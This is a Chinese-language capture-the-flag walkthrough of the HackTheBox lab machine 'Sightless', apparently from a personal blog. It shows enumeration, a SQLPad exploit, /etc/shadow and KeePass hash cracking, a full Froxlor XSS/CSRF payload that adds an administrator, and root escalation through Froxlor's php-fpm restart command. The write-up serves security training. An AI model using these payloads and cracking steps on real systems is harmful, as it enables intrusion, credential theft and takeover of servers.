---
title: Sightless-wp
date: '2024-09-11 00:00:00'
permalink: /post/sightlesswp-zx5emy.html
layout: post
published: true
---



# Sightless-wp

# Sightless

## enum

### nmap

```shell
nmap 10.10.11.32 -p21,22,80 -sC -sV -Pn -o sightless.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2024-09-11 08:10 EDT
Nmap scan report for 10.10.11.32
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94%I=7%D=9/11%Time=66E188AC%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Ser
SF:ver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20try
SF:\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20b
SF:eing\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.70 seconds
```

### 前端源码泄露子域名

```html
<a class="button" href="http://sqlpad.sightless.htb/" data-immersive-translate-walked="288c133c-1ebe-4e12-afb8-ee98d20db7f5" data-immersive-translate-paragraph="1"> Start Now</a>
```

## sqlpad.sightless.htb

子域名后端是sqlpad，版本6.10.0

![image-20240911220352511](/assets/images/image-20240911220352511-20250705113328-sbiygvd.png)

### **[CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)**

这个版本受该cve影响

https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb

下载exphttps://github.com/worm-403/scripts/blob/main/SQLPad_%206.10.0.sh

获取shell

![image-20240911224218811](/assets/images/image-20240911224218811-20250705113328-hsuqxvm.png)

进入后发现在docker里面

## shadow

```
root@c184118df0a6:/home# cat /etc/shadow
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

上hashcat爆破

```
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
Time.Started.....: Wed Sep 11 10:46:29 2024 (30 secs)
Time.Estimated...: Wed Sep 11 10:46:59 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1959 H/s (6.05ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 58496/14344385 (0.41%)
Rejected.........: 0/58496 (0.00%)
Restore.Point....: 58432/14344385 (0.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: jiggy -> ilovetyson
Hardware.Mon.#1..: Util: 92%

Started: Wed Sep 11 10:45:58 2024
Stopped: Wed Sep 11 10:47:01 2024

```

### 凭据

```
michael:insaneclownposse
```

ssh登录后获取第一个flag

## 提权

![image-20240912205404509](/assets/images/image-20240912205404509-20250705113328-oas51gt.png)

内网有个8080端口开启，代出来看看

```sh
ssh -f -N -L 9999:127.0.0.1:8080 michael@sightless.htb
```

![image-20240912205749830](/assets/images/image-20240912205749830-20250705113328-wuvizky.png)

### CVE-2024-34070: Blind XSS Leading to Froxlor Application Compromise

https://advisories.gitlab.com/pkg/composer/froxlor/froxlor/CVE-2024-34070/

本地搭建环境复现一下

payload

```
admin{{$emit.constructor`function b(){var metaTag=document.querySelector('meta[name="csrf-token"]');var csrfToken=metaTag.getAttribute('content');var xhr=new XMLHttpRequest();var url="http://127.0.0.1/froxlor/admin_admins.php";var params="new_loginname=abcd&admin_password=Abcd@@1234&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abcd&email=yldrmtest@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token="+csrfToken+"&page=admins&action=add&send=send";xhr.open("POST",url,true);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");alert("Your Froxlor Application has been completely Hacked");xhr.send(params)};a=b()`()}}
```

这个payload的效果是crsf新建一个管理员用户，账号abcd密码Abcd@@1234，要修改访问ip地址为目标服务器ip，效果如下图。

![image-20240912233420752](/assets/images/image-20240912233420752-20250705113328-ajyyuu2.png)

![image-20240912233403471](/assets/images/image-20240912233403471-20250705113328-dy33l4y.png)

### ftp

找到web1站点，在功能点处修改ftp密码

![image-20240913000737058](/assets/images/image-20240913000737058-20250705113328-rk5f79e.png)

修改后尝试获取文件，但是提示需要ssl，于是利用lftp

```sh
lftp 10.10.11.32
lftp 10.10.11.32:~> user web1 1QAZ2wsx!@#
lftp web1@10.10.11.32:~> ls
`ls' at 0 [FEAT negotiation...]
ls: Fatal error: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (A1:4B:95:93:0A:CF:15:CD:DD:52:68:ED:DB:5B:92:ED:F0:F3:3C:69)
lftp web1@10.10.11.32:~> 
lftp web1@10.10.11.32:~> ls -la
ls: ls -la: Fatal error: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (A1:4B:95:93:0A:CF:15:CD:DD:52:68:ED:DB:5B:92:ED:F0:F3:3C:69)
lftp web1@10.10.11.32:~> set ssl:verify-certificate no
lftp web1@10.10.11.32:~> ls
drwxr-xr-x   3 web1     web1         4096 May 17 03:17 goaccess
-rw-r--r--   1 web1     web1         8376 Mar 29 10:29 index.html
```

利用`set ssl:verify-certificate no`设置忽略ssl证书的正确性。

在goaccess中发现备份文件

![image-20240913000855060](/assets/images/image-20240913000855060-20250705113328-v4t53xp.png)

### keepass

这是个keepass的文件，下载keepass尝试读取文件

https://keepass.info/download.html

> 这里需要注意，要下载1.x的keepass，因为kdb是1.x的文件。2.x读取kdb有点麻烦

打开时发现这个文件依然需要密码，用hashcat爆破一下

```
keepass2john Database.kdb>hash

hashcat -m 13400 -a 0 hash /usr/share/wordlists/rockyou.txt

0d1ff09bf28be9eefa4a3a1a13bfe8594305502d16a8db77b1e64633af0b4f9717ca2959ffe4cc7883829c66043db21bb490279b3a285230df9bf2ff99e2b7a5e5e9d6e9530d8df761ca87ad555a86685737b4d08c42a4467b085eeed5f20aad6a7359b8f5a3bfe6e91130deabd8911597dd4519fd344efb87c3d9571c71891bb7df0e8deec31ae1d7531cc16d20a3b283504993bfda6fd300c26c63c22e577dad658318f581d08c9d798e0130b6e280a92d469a75491575d3e5aac0735eafbade90ad9ac1301f78e43d4d6af579d8bd7716f2a570ba5f818ee5de2e71629e3df44a66950d189d705ea8808df406ebc701c4e3d5892fa5ad1452cc12bf87d79b386a4c55d48bddb0c5db39617d216025c874c08952a97c01fadfe6d65c0a54b9ddaa2b53e928ea11f2831884:bulldogs
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*1*600000*0*6a92df8eddaee09f5738d10aadeec3...831884
Time.Started.....: Thu Sep 12 12:18:35 2024 (41 secs)
Time.Estimated...: Thu Sep 12 12:19:16 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       31 H/s (6.99ms) @ Accel:64 Loops:512 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1280/14344385 (0.01%)
Rejected.........: 0/1280 (0.00%)
Restore.Point....: 1024/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:599552-600000
Candidate.Engine.: Device Generator
Candidates.#1....: kucing -> poohbear1
Hardware.Mon.#1..: Util: 90%

Started: Thu Sep 12 12:18:34 2024
Stopped: Thu Sep 12 12:19:18 2024
```

里面存了root的ssh密码

![image-20240913002158129](/assets/images/image-20240913002158129-20250705113328-a7d35dv.png)

root:q6gnLTB74L132TMdFCpK

这组凭据是假的，用不了

### froxlor php-fpm

Froxlor有个php-fpm功能，其中可以设置php重启命令，

![image-20240913004325082](/assets/images/image-20240913004325082-20250705113328-dvflrbj.png)

这里是利用service命令重启php服务，一般service命令只用root用户能使用。新建一个php-fpm，尝试利用重启功能执行命令，然后看看权限如何，到底是不是root

![image-20240913004750135](/assets/images/image-20240913004750135-20250705113328-b5qey2g.png)

试的时候发现这个地方会检测特殊字符，`> | ; 换行`等等都不能有。接着配置我们的恶意php configuration

![image-20240913005441818](/assets/images/image-20240913005441818-20250705113328-mhdk2ay.png)

然后想办法让php-fpm重启

![image-20240913005525837](/assets/images/image-20240913005525837-20250705113328-0i4r48p.png)

寻找一番后发现修改php-fpm的设置会使得服务重启。

![image-20240913005554175](/assets/images/image-20240913005554175-20250705113328-todda1v.png)

发现权限确实是root

### root

将root私钥复制出来，并且还要赋予读权限。而且每次执行命令需要新建php-fpm

‍
